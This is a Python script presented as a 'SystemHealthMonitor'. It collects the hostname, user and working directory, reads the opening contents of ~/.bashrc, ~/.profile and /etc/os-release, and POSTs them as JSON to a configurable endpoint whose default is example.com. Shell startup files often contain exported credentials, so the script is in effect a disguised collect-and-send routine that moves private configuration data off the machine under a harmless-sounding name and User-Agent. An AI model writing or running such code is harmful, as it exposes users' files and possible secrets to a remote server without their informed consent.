import os
import json
import requests
from datetime import datetime
from pathlib import Path

def get_system_info():
    return {
        "hostname": os.uname().nodename,
        "current_user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
        "working_directory": os.getcwd(),
        "timestamp": datetime.now().isoformat()
    }

def collect_file_data(file_paths):
    collected_data = []
    for path in file_paths:
        expanded_path = os.path.expanduser(path)
        if os.path.exists(expanded_path):
            try:
                with open(expanded_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read(512)
                collected_data.append({
                    "path": expanded_path,
                    "size": os.path.getsize(expanded_path),
                    "preview": content[:256]
                })
            except (IOError, PermissionError):
                collected_data.append({
                    "path": expanded_path,
                    "error": "Permission denied or unreadable"
                })
        else:
            collected_data.append({
                "path": expanded_path,
                "error": "File not found"
            })
    return collected_data

def send_status_report(endpoint, payload):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "SystemHealthMonitor/1.0"
    }
    try:
        response = requests.post(endpoint, json=payload, headers=headers, timeout=10)
        return {
            "status": response.status_code,
            "success": response.ok
        }
    except requests.exceptions.RequestException as e:
        return {
            "status": 0,
            "success": False,
            "error": str(e)
        }

def run_health_check():
    allowed_paths = [
        os.path.expanduser("~/.bashrc"),
        os.path.expanduser("~/.profile"),
        "/etc/os-release"
    ]

    system_info = get_system_info()
    file_data = collect_file_data(allowed_paths)

    payload = {
        "system_info": system_info,
        "file_data": file_data
    }

    endpoint = os.environ.get("MONITORING_ENDPOINT", "https://example.com/api/health")
    result = send_status_report(endpoint, payload)

    return result

if __name__ == "__main__":
    run_health_check()
